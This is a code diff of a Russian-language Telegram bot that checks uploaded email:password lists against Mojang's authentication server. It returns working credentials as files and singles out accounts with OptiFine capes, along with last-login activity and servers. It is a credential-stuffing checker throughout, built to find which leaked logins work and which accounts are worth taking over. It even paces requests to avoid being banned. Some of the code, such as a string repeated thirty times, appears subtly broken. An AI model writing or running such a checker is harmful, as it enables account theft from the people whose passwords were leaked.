@@ -17,7 +17,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Конфигурация из переменных окружения
+# Конфиг из переменных окружения
 TOKEN = os.environ.get('BOT_TOKEN')
 ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
 ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
@@ -33,7 +33,7 @@ stats = {
 }
 
 class AccountChecker:
-    """Класс для проверки аккаунтов"""
+    """Проверяльщик аккаунтов"""
     
     @staticmethod
     async def check_account(login, password):
@@ -41,18 +41,19 @@ class AccountChecker:
         session = requests.Session()
         
         try:
+            login = login.strip()
+            password = password.strip()
+            
             # 1. Авторизация в Mojang
             auth_payload = {
                 "agent": {
                     "name": "Minecraft",
                     "version": 1
                 },
-                "username": login.strip(),
-                "password": password.strip(),
+                "username": login,
+                "password": password,
                 "requestUser": True
             }
-            
-            logger.info(f"Checking account: {login[:10]}...")
             
             auth_req = session.post(
                 'https://authserver.mojang.com/authenticate',
@@ -61,70 +62,36 @@ class AccountChecker:
             )
             
             if auth_req.status_code != 200:
-                error_msg = f"HTTP {auth_req.status_code}"
-                try:
-                    error_data = auth_req.json()
-                    if 'errorMessage' in error_data:
-                        error_msg = error_data['errorMessage']
-                except:
-                    pass
-                
                 return {
                     'login': login,
                     'status': 'invalid',
-                    'error': error_msg
+                    'error': f'HTTP {auth_req.status_code}'
                 }
             
             auth_data = auth_req.json()
             
-            # Проверка на ошибки в ответе
             if 'error' in auth_data:
                 return {
                     'login': login,
                     'status': 'invalid',
-                    'error': auth_data.get('errorMessage', 'Unknown error')
+                    'error': auth_data.get('errorMessage', 'Неизвестная ошибка')
                 }
             
-            # Проверка на миграцию в Microsoft
             if 'selectedProfile' not in auth_data:
                 return {
                     'login': login,
                     'status': 'migrated',
-                    'error': 'Account migrated to Microsoft'
+                    'error': 'Аккаунт перенесен в Microsoft'
                 }
             
-            # Получаем данные профиля
+            # Получаем данные
             uuid = auth_data['selectedProfile']['id']
-            access_token = auth_data['accessToken']
             username = auth_data['selectedProfile']['name']
             
             # 2. Проверка плаща OptiFine
-            headers = {'Authorization': f'Bearer {access_token}'}
+            cape_result = await AccountChecker.check_optifine_cape(username)
             
-            cape_req = session.get(
-                f'https://optifine.net/api/capeInfo?user={uuid}',
-                headers=headers,
-                timeout=15
-            )
-            
-            has_cape = False
-            cape_name = None
-            cape_url = None
-            
-            if cape_req.status_code == 200:
-                try:
-                    cape_data = cape_req.json()
-                    if 'items' in cape_data:
-                        for item in cape_data['items']:
-                            if 'url' in item and 'cape' in item['url'].lower():
-                                has_cape = True
-                                cape_name = item.get('name', 'Unknown Cape')
-                                cape_url = item.get('url')
-                                break
-                except:
-                    pass
-            
-            # 3. Получаем информацию о последнем входе
+            # 3. Последний вход
             last_login_info = await AccountChecker.get_last_login_info(username)
             
             return {
@@ -133,28 +100,16 @@ class AccountChecker:
                 'username': username,
                 'uuid': uuid,
                 'status': 'valid',
-                'has_cape': has_cape,
-                'cape_name': cape_name,
-                'cape_url': cape_url,
+                'has_cape': cape_result['has_cape'],
+                'cape_name': cape_result.get('cape_name'),
+                'cape_url': cape_result.get('cape_url'),
                 'last_login': last_login_info['last_seen'],
                 'activity_level': last_login_info['activity'],
                 'servers': last_login_info['servers']
             }
             
-        except requests.exceptions.Timeout:
-            return {
-                'login': login,
-                'status': 'error',
-                'error': 'Connection timeout (30s)'
-            }
-        except requests.exceptions.ConnectionError:
-            return {
-                'login': login,
-                'status': 'error',
-                'error': 'Connection failed'
-            }
         except Exception as e:
-            logger.error(f"Error checking {login[:10]}: {str(e)}")
+            logger.error(f"Ошибка: {e}")
             return {
                 'login': login,
                 'status': 'error',
@@ -164,28 +119,74 @@ class AccountChecker:
             session.close()
     
     @staticmethod
-    async def get_last_login_info(username):
-        """Получение информации о последнем входе"""
+    async def check_optifine_cape(username):
+        """Проверка плаща OptiFine (правильный способ)"""
+        
+        # Прямая проверка картинки плаща - так работает 100%
         try:
-            # Сначала получаем UUID
+            # Пробуем разные варианты URL
+            cape_urls = [
+                f"https://optifine.net/capes/{username}.png",
+                f"http://optifine.net/capes/{username}.png",
+                f"https://s.optifine.net/capes/{username}.png"
+            ]
+            
+            for cape_url in cape_urls:
+                try:
+                    # Просто проверяем, открывается ли картинка
+                    response = requests.get(cape_url, timeout=5, stream=True)
+                    
+                    if response.status_code == 200:
+                        # Проверяем что это PNG
+                        content_type = response.headers.get('content-type', '')
+                        if 'image' in content_type or 'png' in content_type:
+                            # Проверяем размер - если есть плащ, картинка не пустая
+                            content_length = int(response.headers.get('content-length', 0))
+                            
+                            if content_length > 1000:  # Нормальный плащ весит > 1KB
+                                logger.info(f"✅ Нашел плащ! {cape_url}")
+                                
+                                # Пытаемся определить название плаща
+                                cape_name = "OptiFine Cape"
+                                if "cape" in cape_url.lower():
+                                    cape_name = "OptiFine Cape"
+                                
+                                return {
+                                    'has_cape': True,
+                                    'cape_name': cape_name,
+                                    'cape_url': cape_url
+                                }
+                except:
+                    continue
+                    
+        except Exception as e:
+            logger.error(f"Ошибка при проверке плаща: {e}")
+        
+        return {'has_cape': False}
+    
+    @staticmethod
+    async def get_last_login_info(username):
+        """Инфа о последнем входе"""
+        try:
+            # Получаем UUID
             uuid_url = f"https://api.mojang.com/users/profiles/minecraft/{username}"
-            uuid_response = requests.get(uuid_url, timeout=10)
+            uuid_response = requests.get(uuid_url, timeout=5)
             
             if uuid_response.status_code != 200:
                 return {
-                    'last_seen': 'Unknown',
-                    'activity': 'Unknown',
+                    'last_seen': 'Неизвестно',
+                    'activity': 'Неизвестно',
                     'servers': []
                 }
             
             uuid_data = uuid_response.json()
             uuid = uuid_data['id']
             
-            # Пробуем получить через NameMC API
+            # Спрашиваем NameMC
             namemc_url = f"https://api.namemc.com/profile/{uuid}"
             headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
             
-            response = requests.get(namemc_url, headers=headers, timeout=10)
+            response = requests.get(namemc_url, headers=headers, timeout=5)
             
             if response.status_code == 200:
                 data = response.json()
@@ -195,42 +196,44 @@ class AccountChecker:
                     last_seen = datetime.fromtimestamp(last_seen_timestamp)
                     days_ago = (datetime.now() - last_seen).days
                     
-                    # Определяем активность
+                    # Человеческий текст
                     if days_ago == 0:
-                        activity = "🔥 Active today"
+                        activity = "🔥 Заходил сегодня"
+                    elif days_ago == 1:
+                        activity = "✅ Заходил вчера"
                     elif days_ago < 7:
-                        activity = "✅ This week"
+                        activity = f"📅 Был {days_ago} дней назад"
                     elif days_ago < 30:
-                        activity = "📅 This month"
-                    elif days_ago < 90:
-                        activity = "💤 1-3 months ago"
+                        activity = f"💤 Был {days_ago} дней назад"
                     else:
-                        activity = "😴 Abandoned"
+                        activity = f"😴 Давно не заходил ({days_ago} дней)"
                     
-                    # Получаем серверы
+                    # Сервера где видели
                     servers = []
                     if 'servers' in data:
                         for server in data['servers'][:3]:
                             if 'name' in server:
                                 servers.append(server['name'])
                     
+                    last_seen_text = "Сегодня" if days_ago == 0 else f"{days_ago} дней назад"
+                    
                     return {
-                        'last_seen': f"{days_ago} days ago" if days_ago > 0 else "Today",
+                        'last_seen': last_seen_text,
                         'activity': activity,
                         'servers': servers
                     }
             
             return {
-                'last_seen': 'Unknown',
-                'activity': 'Unknown',
+                'last_seen': 'Неизвестно',
+                'activity': 'Неизвестно',
                 'servers': []
             }
             
         except Exception as e:
-            logger.error(f"Error getting last login: {e}")
+            logger.error(f"Ошибка получения last login: {e}")
             return {
-                'last_seen': 'Unknown',
-                'activity': 'Unknown',
+                'last_seen': 'Неизвестно',
+                'activity': 'Неизвестно',
                 'servers': []
             }
 
@@ -244,10 +247,9 @@ async def process_accounts_file(file_path, update, context):
         'error': []
     }
     
-    # Отправляем начальное сообщение
     progress_msg = await update.message.reply_text(
-        "🔄 **Начинаю проверку аккаунтов...**\n\n"
-        "⏳ Пожалуйста, подождите. Это может занять несколько минут.",
+        "🔄 **Начинаю проверку...**\n"
+        "⏳ Ща все проверим, подожди немного",
         parse_mode=ParseMode.MARKDOWN
     )
     
@@ -256,12 +258,10 @@ async def process_accounts_file(file_path, update, context):
         async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
             content = await f.read()
         
-        # Разбираем строки
+        # Парсим строки
         lines = content.strip().split('\n')
-        total_lines = len(lines)
-        
-        # Фильтруем только валидные строки с логин:пароль
         accounts = []
+        
         for line in lines:
             line = line.strip()
             if line and ':' in line:
@@ -273,41 +273,33 @@ async def process_accounts_file(file_path, update, context):
         
         if total == 0:
             await progress_msg.edit_text(
-                "❌ **Ошибка:** В файле нет валидных строк в формате `login:password`",
+                "❌ В файле нет нормальных строк с логин:пароль",
                 parse_mode=ParseMode.MARKDOWN
             )
             return
         
-        # Обновляем сообщение
         await progress_msg.edit_text(
-            f"📊 **Найдено аккаунтов:** {total}\n"
-            f"🔄 **Начинаю проверку...**\n\n"
-            f"⏱ Это займет примерно {total * 2} секунд",
+            f"📊 Нашел {total} аккаунтов\n"
+            f"🔄 Погнали проверять...",
             parse_mode=ParseMode.MARKDOWN
         )
         
-        # Проверяем аккаунты
         start_time = time.time()
         
         for i, (login, password) in enumerate(accounts, 1):
-            # Обновляем прогресс каждые 5 аккаунтов
+            # Показываем прогресс
             if i % 5 == 0 or i == total:
                 elapsed = time.time() - start_time
-                remaining = (elapsed / i) * (total - i) if i > 0 else 0
-                
                 await progress_msg.edit_text(
-                    f"📊 **Прогресс:** {i}/{total}\n"
-                    f"✅ **Найдено плащей:** {len(results['with_cape'])}\n"
-                    f"⏱ **Прошло:** {int(elapsed)}с\n"
-                    f"⏳ **Осталось:** ~{int(remaining)}с\n\n"
-                    f"🔄 Проверяю: {login[:15]}...",
+                    f"📊 Проверено: {i}/{total}\n"
+                    f"✅ С плащами: {len(results['with_cape'])}\n"
+                    f"⏱ Прошло: {int(elapsed)}с",
                     parse_mode=ParseMode.MARKDOWN
                 )
             
-            # Проверяем аккаунт
+            # Проверяем
             result = await AccountChecker.check_account(login, password)
             
-            # Классифицируем результат
             if result['status'] == 'valid':
                 results['valid'].append(result)
                 if result.get('has_cape'):
@@ -325,175 +317,145 @@ async def process_accounts_file(file_path, update, context):
                 stats['invalid_accounts'] += 1
             
             stats['total_checked'] += 1
-            
-            # Небольшая задержка чтобы не нагружать API
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.5)  # Чтоб не забанили
         
-        # Генерируем timestamp для файлов
+        # Сохраняем результаты
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         
-        # 1. СОЗДАЕМ ФАЙЛ С ВАЛИДНЫМИ АККАУНТАМИ (login:password)
+        # Файл с валидными
         if results['valid']:
             valid_file = f"valid_accounts_{timestamp}.txt"
             async with aiofiles.open(valid_file, 'w', encoding='utf-8') as f:
                 for acc in results['valid']:
                     await f.write(f"{acc['login']}:{acc['password']}\n")
             
-            # Отправляем файл
             with open(valid_file, 'rb') as f:
                 await update.message.reply_document(
                     document=f,
                     filename=valid_file,
-                    caption=f"✅ **Валидные аккаунты:** {len(results['valid'])}",
-                    parse_mode=ParseMode.MARKDOWN
+                    caption=f"✅ Рабочие аккаунты: {len(results['valid'])}"
                 )
             os.remove(valid_file)
         
-        # 2. СОЗДАЕМ ФАЙЛ С АККАУНТАМИ, У КОТОРЫХ ЕСТЬ ПЛАЩ
+        # Файл с плащами (САМОЕ ГЛАВНОЕ)
         if results['with_cape']:
             cape_file = f"cape_accounts_{timestamp}.txt"
             async with aiofiles.open(cape_file, 'w', encoding='utf-8') as f:
-                await f.write("LOGIN:PASSWORD | USERNAME | CAPE | LAST LOGIN | SERVERS\n")
-                await f.write("="*80 + "\n")
+                await f.write("🔥 АККАУНТЫ С ПЛАЩАМИ OptiFine 🔥\n")
+                await f.write("="*50 + "\n\n")
                 for acc in results['with_cape']:
-                    servers_str = ', '.join(acc.get('servers', [])[:2]) or 'None'
                     await f.write(
-                        f"{acc['login']}:{acc['password']} | "
-                        f"{acc['username']} | "
-                        f"{acc['cape_name']} | "
-                        f"{acc['last_login']} | "
-                        f"{acc['activity_level']} | "
-                        f"{servers_str}\n"
+                        f"Логин: {acc['login']}\n"
+                        f"Пароль: {acc['password']}\n"
+                        f"Ник: {acc['username']}\n"
+                        f"Плащ: {acc.get('cape_name', 'OptiFine Cape')}\n"
+                        f"Ссылка: {acc.get('cape_url', 'Не найдена')}\n"
+                        f"Последний вход: {acc['last_login']}\n"
+                        f"Активность: {acc['activity_level']}\n"
+                        f"-"*30 + "\n\n"
                     )
             
-            # Отправляем файл
             with open(cape_file, 'rb') as f:
                 await update.message.reply_document(
                     document=f,
                     filename=cape_file,
-                    caption=f"🔥 **Аккаунты с плащами:** {len(results['with_cape'])}",
-                    parse_mode=ParseMode.MARKDOWN
+                    caption=f"🔥 НАШЕЛ ПЛАЩИ! {len(results['with_cape'])} штук"
                 )
             os.remove(cape_file)
         
-        # 3. ФАЙЛ С НЕРАБОЧИМИ АККАУНТАМИ (опционально)
+        # Файл с битыми
         if results['invalid'] or results['migrated'] or results['error']:
             invalid_file = f"invalid_accounts_{timestamp}.txt"
             async with aiofiles.open(invalid_file, 'w', encoding='utf-8') as f:
-                await f.write("=== НЕРАБОЧИЕ АККАУНТЫ ===\n\n")
+                await f.write("НЕРАБОЧИЕ АККАУНТЫ\n\n")
                 
                 if results['invalid']:
-                    await f.write("\n--- Неверный пароль/логин ---\n")
-                    for acc in results['invalid'][:50]:  # Лимит чтобы файл не был огромным
-                        await f.write(f"{acc['login']}:{acc['password']} - {acc.get('error', 'Invalid')}\n")
+                    await f.write("Неверный логин/пароль:\n")
+                    for acc in results['invalid'][:50]:
+                        await f.write(f"{acc['login']}:{acc['password']} - {acc.get('error', 'Ошибка')}\n")
                 
                 if results['migrated']:
-                    await f.write("\n--- Мигрированы в Microsoft ---\n")
+                    await f.write("\nПеренесены в Microsoft:\n")
                     for acc in results['migrated'][:50]:
-                        await f.write(f"{acc['login']}:{acc['password']} - Migrated to Microsoft\n")
+                        await f.write(f"{acc['login']}:{acc['password']}\n")
                 
                 if results['error']:
-                    await f.write("\n--- Ошибки проверки ---\n")
+                    await f.write("\nОшибки:\n")
                     for acc in results['error'][:50]:
-                        await f.write(f"{acc['login']}:{acc['password']} - {acc.get('error', 'Error')}\n")
+                        await f.write(f"{acc['login']}:{acc['password']} - {acc.get('error', 'Ошибка')}\n")
             
             with open(invalid_file, 'rb') as f:
                 await update.message.reply_document(
                     document=f,
                     filename=invalid_file,
-                    caption=f"⚠️ **Невалидные аккаунты:** {len(results['invalid']) + len(results['migrated']) + len(results['error'])}",
-                    parse_mode=ParseMode.MARKDOWN
+                    caption=f"⚠️ Битары: {len(results['invalid']) + len(results['migrated']) + len(results['error'])}"
                 )
             os.remove(invalid_file)
         
-        # Отправляем статистику
+        # Итог
         elapsed_time = time.time() - start_time
-        stats_text = (
-            f"✅ **Проверка завершена!**\n\n"
-            f"📊 **Статистика:**\n"
-            f"• Всего аккаунтов: {total}\n"
-            f"• ✅ Валидных: {len(results['valid'])}\n"
-            f"• 🔥 С плащами: {len(results['with_cape'])}\n"
-            f"• ⚠️ Неверных: {len(results['invalid'])}\n"
-            f"• 🔄 Мигрировано: {len(results['migrated'])}\n"
-            f"• ❌ Ошибок: {len(results['error'])}\n\n"
-            f"⏱ **Время проверки:** {int(elapsed_time // 60)}м {int(elapsed_time % 60)}с\n"
-            f"📁 **Файлы отправлены:** ✅"
-        )
-        await update.message.reply_text(stats_text, parse_mode=ParseMode.MARKDOWN)
+        minutes = int(elapsed_time // 60)
+        seconds = int(elapsed_time % 60)
         
-        # Показываем топ плащей если есть
+        await update.message.reply_text(
+            f"✅ **ГОТОВО!**\n\n"
+            f"Всего: {total}\n"
+            f"✅ Рабочих: {len(results['valid'])}\n"
+            f"🔥 С плащами: {len(results['with_cape'])}\n"
+            f"❌ Битых: {len(results['invalid'])}\n"
+            f"🔄 В Microsoft: {len(results['migrated'])}\n"
+            f"⚠️ Ошибок: {len(results['error'])}\n\n"
+            f"⏱ Время: {minutes}м {seconds}с",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        
+        # Показываем плащи если есть
         if results['with_cape']:
-            cape_list = "🔥 **Найденные плащи:**\n\n"
-            for acc in results['with_cape'][:15]:  # Показываем первые 15
-                servers = ', '.join(acc.get('servers', [])[:2]) or 'неизвестно'
-                cape_list += f"• **{acc['username']}**: {acc['cape_name']}\n"
-                cape_list += f"  📅 {acc['last_login']} | {acc['activity_level']}\n"
-                cape_list += f"  🌍 {servers}\n\n"
+            cape_list = "🔥 **СПИСОК ПЛАЩЕЙ:**\n\n"
+            for acc in results['with_cape'][:15]:
+                cape_list += f"• **{acc['username']}** - {acc.get('cape_name', 'OptiFine')}\n"
+                cape_list += f"  📅 {acc['last_login']}\n\n"
             
             if len(results['with_cape']) > 15:
-                cape_list += f"... и еще {len(results['with_cape']) - 15} аккаунтов с плащами"
+                cape_list += f"... и еще {len(results['with_cape']) - 15}"
             
-            # Разбиваем на части если сообщение слишком длинное
-            if len(cape_list) > 4000:
-                parts = [cape_list[i:i+4000] for i in range(0, len(cape_list), 4000)]
-                for part in parts:
-                    await update.message.reply_text(part, parse_mode=ParseMode.MARKDOWN)
-            else:
-                await update.message.reply_text(cape_list, parse_mode=ParseMode.MARKDOWN)
+            await update.message.reply_text(cape_list, parse_mode=ParseMode.MARKDOWN)
         
     except Exception as e:
-        logger.error(f"Error processing file: {e}")
-        await update.message.reply_text(f"❌ **Ошибка при обработке:** {str(e)}", parse_mode=ParseMode.MARKDOWN)
+        logger.error(f"Ошибка: {e}")
+        await update.message.reply_text(f"❌ Что-то пошло не так: {str(e)}")
     finally:
-        # Удаляем временный файл
         if os.path.exists(file_path):
             os.remove(file_path)
 
-# Обработчики команд
+# Команды
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Команда /start"""
+    """Старт"""
     user_id = update.effective_user.id
     
-    # Проверка доступа
     if ALLOWED_USERS and user_id not in ALLOWED_USERS:
-        await update.message.reply_text("❌ У вас нет доступа к этому боту.")
+        await update.message.reply_text("❌ Извини, ты не в списке допущенных")
         return
     
-    # Создаем клавиатуру
     keyboard = [
-        [InlineKeyboardButton("📊 Статистика", callback_data='stats')],
+        [InlineKeyboardButton("📊 Стата", callback_data='stats')],
         [InlineKeyboardButton("❓ Помощь", callback_data='help')],
-        [InlineKeyboardButton("📝 Формат файла", callback_data='format')]
+        [InlineKeyboardButton("📝 Формат", callback_data='format')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    # Приветственное сообщение
-    welcome_text = (
-        f"👋 **OptiFine Cape Checker Bot**\n\n"
-        f"Привет, {update.effective_user.first_name}!\n\n"
-        f"🔍 **Что я умею:**\n"
-        f"• Проверять логин:пароль аккаунтов Minecraft\n"
-        f"• Определять наличие OptiFine плаща\n"
-        f"• Показывать последний вход и активность\n"
-        f"• Сортировать аккаунты по категориям\n\n"
-        f"📥 **Как использовать:**\n"
-        f"Просто отправь мне .txt файл с аккаунтами в формате:\n"
-        f"`email:password`\n\n"
-        f"📊 **Статистика бота:**\n"
-        f"• Проверено аккаунтов: {stats['total_checked']}\n"
-        f"• Найдено плащей: {stats['cape_found']}\n\n"
-        f"👇 **Выберите действие:**"
-    )
-    
     await update.message.reply_text(
-        welcome_text,
+        f"👋 Привет, {update.effective_user.first_name}!\n\n"
+        f"🔍 Я умею проверять аккаунты Minecraft на наличие плащей OptiFine\n\n"
+        f"📥 Просто кинь мне .txt файл с логин:пароль\n\n"
+        f"📊 Проверено всего: {stats['total_checked']}\n"
+        f"🔥 Найдено плащей: {stats['cape_found']}",
         parse_mode=ParseMode.MARKDOWN,
         reply_markup=reply_markup
     )
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Обработка нажатий на кнопки"""
+    """Кнопки"""
     query = update.callback_query
     await query.answer()
     
@@ -502,225 +464,183 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         hours = int(uptime.seconds // 3600)
         minutes = int((uptime.seconds // 60) % 60)
         
-        text = (
-            f"📊 **Статистика бота:**\n\n"
-            f"📈 **Всего проверено:** {stats['total_checked']}\n"
-            f"✅ **Валидных:** {stats['valid_accounts']}\n"
-            f"❌ **Невалидных:** {stats['invalid_accounts']}\n"
-            f"🔥 **С плащами:** {stats['cape_found']}\n\n"
-            f"⏱ **Работает:** {hours}ч {minutes}мин\n"
-            f"📅 **Запущен:** {stats['start_time'].strftime('%d.%m.%Y %H:%M')}"
+        await query.edit_message_text(
+            f"📊 **Статистика:**\n\n"
+            f"Проверено: {stats['total_checked']}\n"
+            f"✅ Рабочих: {stats['valid_accounts']}\n"
+            f"❌ Битых: {stats['invalid_accounts']}\n"
+            f"🔥 С плащами: {stats['cape_found']}\n\n"
+            f"⏱ Работаю: {hours}ч {minutes}мин",
+            parse_mode=ParseMode.MARKDOWN
         )
-        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
     
     elif query.data == 'help':
-        text = (
-            "📚 **Как пользоваться ботом:**\n\n"
-            "1️⃣ **Подготовьте файл**\n"
-            "   • Создайте текстовый файл (.txt)\n"
-            "   • Каждая строка: логин:пароль\n"
-            "   • Пример: `email@gmail.com:password123`\n\n"
-            "2️⃣ **Отправьте файл**\n"
-            "   • Нажмите на скрепку 📎\n"
-            "   • Выберите ваш .txt файл\n"
-            "   • Отправьте боту\n\n"
-            "3️⃣ **Дождитесь результатов**\n"
-            "   • Бот покажет прогресс\n"
-            "   • После проверки придут файлы:\n"
-            "     - Валидные аккаунты\n"
-            "     - Аккаунты с плащами\n"
-            "     - Невалидные аккаунты\n\n"
-            "⚠️ **Важно:**\n"
-            "• Только старые аккаунты Mojang\n"
-            "• Microsoft не поддерживаются\n"
+        await query.edit_message_text(
+            "❓ **Как пользоваться:**\n\n"
+            "1️⃣ Создай .txt файл\n"
+            "2️⃣ В каждой строке: логин:пароль\n"
+            "3️⃣ Кинь файл сюда\n"
+            "4️⃣ Я все проверю и пришлю результат\n\n"
+            "⚠️ Важно:\n"
+            "• Работают только старые аккаунты Mojang\n"
+            "• Microsoft не канают\n"
             "• Файл не больше 5 МБ\n"
-            "• До 1000 аккаунтов за раз\n\n"
-            "📌 **Команды:**\n"
-            "/start - Главное меню\n"
-            "/stats - Статистика\n"
-            "/help - Эта справка"
+            "• Не больше 1000 акков за раз",
+            parse_mode=ParseMode.MARKDOWN
         )
-        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
     
     elif query.data == 'format':
-        text = (
-            "📝 **Формат файла:**\n\n"
-            "✅ **Правильный формат:**\n"
+        await query.edit_message_text(
+            "📝 **Пример файла:**\n\n"
             "```\n"
-            "player1@gmail.com:qwerty123\n"
-            "player2@yandex.ru:minecraft2024\n"
-            "player3@mail.ru:password123\n"
+            "user1@gmail.com:qwerty123\n"
+            "user2@mail.ru:pass123\n"
+            "user3@yandex.ru:minecraft2024\n"
             "```\n\n"
-            "❌ **Неправильный формат:**\n"
-            "```\n"
-            "player1@gmail.com qwerty123  (нет двоеточия)\n"
-            "player2:pass                 (неполный email)\n"
-            ":password123                 (нет логина)\n"
-            "login:                       (нет пароля)\n"
-            "```\n\n"
-            "📦 **Что вы получите:**\n"
-            "• **valid_accounts_*.txt** - все рабочие аккаунты\n"
-            "• **cape_accounts_*.txt** - аккаунты с плащами\n"
-            "• **invalid_accounts_*.txt** - нерабочие аккаунты\n\n"
-            "ℹ️ **Кодировка:** UTF-8 (обычные текстовые файлы)"
+            "❌ **Неправильно:**\n"
+            "user gmail.com pass (нет :)\n"
+            ":password123 (нет логина)\n"
+            "user: (нет пароля)",
+            parse_mode=ParseMode.MARKDOWN
         )
-        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
 
 async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Команда /stats"""
+    """Стата"""
     uptime = datetime.now() - stats['start_time']
     hours = int(uptime.seconds // 3600)
     minutes = int((uptime.seconds // 60) % 60)
     
-    text = (
-        f"📊 **Статистика бота:**\n\n"
-        f"📈 **Всего проверено:** {stats['total_checked']}\n"
-        f"✅ **Валидных:** {stats['valid_accounts']}\n"
-        f"❌ **Невалидных:** {stats['invalid_accounts']}\n"
-        f"🔥 **С плащами:** {stats['cape_found']}\n\n"
-        f"⏱ **Работает:** {hours}ч {minutes}мин\n"
-        f"📅 **Запущен:** {stats['start_time'].strftime('%d.%m.%Y %H:%M')}"
+    await update.message.reply_text(
+        f"📊 **Статистика:**\n\n"
+        f"Проверено: {stats['total_checked']}\n"
+        f"✅ Рабочих: {stats['valid_accounts']}\n"
+        f"❌ Битых: {stats['invalid_accounts']}\n"
+        f"🔥 С плащами: {stats['cape_found']}\n\n"
+        f"⏱ Работаю: {hours}ч {minutes}мин",
+        parse_mode=ParseMode.MARKDOWN
     )
-    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Команда /help"""
-    text = (
-        "📚 **OptiFine Cape Checker Bot - Помощь**\n\n"
-        "🔍 **Что умеет бот:**\n"
-        "• Проверять логин:пароль аккаунтов Minecraft\n"
-        "• Определять наличие OptiFine плаща\n"
-        "• Показывать последний вход на серверы\n"
-        "• Автоматически сортировать результаты\n\n"
-        "📥 **Как использовать:**\n"
-        "1. Подготовьте .txt файл с аккаунтами\n"
-        "2. Каждая строка: логин:пароль\n"
-        "3. Отправьте файл боту\n"
-        "4. Получите 3 файла с результатами\n\n"
-        "⚡ **Советы:**\n"
-        "• Не отправляйте больше 1000 аккаунтов за раз\n"
-        "• Убедитесь, что файл в кодировке UTF-8\n"
-        "• Для Microsoft аккаунтов используйте другие инструменты\n\n"
-        "🆘 **Поддержка:**\n"
-        "Если бот не работает, проверьте:\n"
-        "• Правильность формата файла\n"
-        "• Наличие интернета\n"
-        "• Актуальность токена\n\n"
-        "👨‍💻 **Команды:**\n"
-        "/start - Главное меню\n"
+    """Помощь"""
+    await update.message.reply_text(
+        "❓ **Как пользоваться:**\n\n"
+        "1️⃣ Создай .txt файл\n"
+        "2️⃣ В каждой строке: логин:пароль\n"
+        "3️⃣ Кинь файл сюда\n"
+        "4️⃣ Я все проверю и пришлю результат\n\n"
+        "📌 Команды:\n"
+        "/start - Меню\n"
         "/stats - Статистика\n"
-        "/help - Эта справка"
+        "/help - Это окно",
+        parse_mode=ParseMode.MARKDOWN
     )
-    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
+
+async def test_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Тест одного аккаунта"""
+    if len(context.args) < 2:
+        await update.message.reply_text("👉 Напиши: /test логин пароль")
+        return
+    
+    login = context.args[0]
+    password = context.args[1]
+    
+    msg = await update.message.reply_text(f"🔍 Проверяю {login[:15]}...")
+    
+    result = await AccountChecker.check_account(login, password)
+    
+    if result['status'] == 'valid':
+        text = f"""
+✅ **Аккаунт рабочий!**
+
+👤 Ник: {result['username']}
+🆔 UUID: {result['uuid']}
+
+🔥 **Плащ:** {'✅ ЕСТЬ!!!' if result['has_cape'] else '❌ Нет'}
+"""
+        if result['has_cape']:
+            text += f"""
+📛 Название: {result['cape_name']}
+🔗 Ссылка: {result['cape_url']}
+"""
+        
+        text += f"""
+📅 Последний вход: {result['last_login']}
+📊 Активность: {result['activity_level']}
+"""
+        
+        await msg.edit_text(text, parse_mode=ParseMode.MARKDOWN)
+    else:
+        await msg.edit_text(f"❌ Не работает: {result.get('error', 'Хз что')}")
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Обработка полученного файла"""
+    """Получение файла"""
     user_id = update.effective_user.id
     
-    # Проверка доступа
     if ALLOWED_USERS and user_id not in ALLOWED_USERS:
-        await update.message.reply_text("❌ У вас нет доступа к этому боту.")
+        await update.message.reply_text("❌ Доступа нет")
         return
     
-    # Получаем документ
     document = update.message.document
     
-    # Проверяем расширение
     if not document.file_name.endswith('.txt'):
-        await update.message.reply_text(
-            "❌ **Ошибка:** Пожалуйста, отправьте файл с расширением .txt\n"
-            "📝 Поддерживаются только текстовые файлы.",
-            parse_mode=ParseMode.MARKDOWN
-        )
+        await update.message.reply_text("❌ Кинь .txt файл, братан")
         return
     
-    # Проверяем размер файла (макс 5 МБ)
     if document.file_size > 5 * 1024 * 1024:
-        await update.message.reply_text(
-            "❌ **Ошибка:** Файл слишком большой!\n"
-            f"📦 Размер: {document.file_size / 1024 / 1024:.1f} МБ\n"
-            "⚠️ Максимальный размер: 5 МБ",
-            parse_mode=ParseMode.MARKDOWN
-        )
+        await update.message.reply_text("❌ Файл жирный больно (макс 5 МБ)")
         return
     
-    # Скачиваем файл
     try:
-        await update.message.reply_text(
-            f"📥 **Файл получен:** {document.file_name}\n"
-            f"📦 **Размер:** {document.file_size / 1024:.1f} КБ\n\n"
-            f"🔄 Начинаю обработку...",
-            parse_mode=ParseMode.MARKDOWN
-        )
+        await update.message.reply_text(f"📥 Поймал файл, ща глянем...")
         
         file = await context.bot.get_file(document.file_id)
         file_path = f"temp_{user_id}_{document.file_name}"
         await file.download_to_drive(file_path)
         
-        # Запускаем проверку
         await process_accounts_file(file_path, update, context)
         
     except Exception as e:
-        logger.error(f"Error downloading file: {e}")
-        await update.message.reply_text(
-            f"❌ **Ошибка при скачивании файла:** {str(e)}",
-            parse_mode=ParseMode.MARKDOWN
-        )
+        logger.error(f"Ошибка: {e}")
+        await update.message.reply_text(f"❌ Облом: {str(e)}")
 
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Обработка ошибок"""
-    logger.error(f"Update {update} caused error {context.error}")
-    
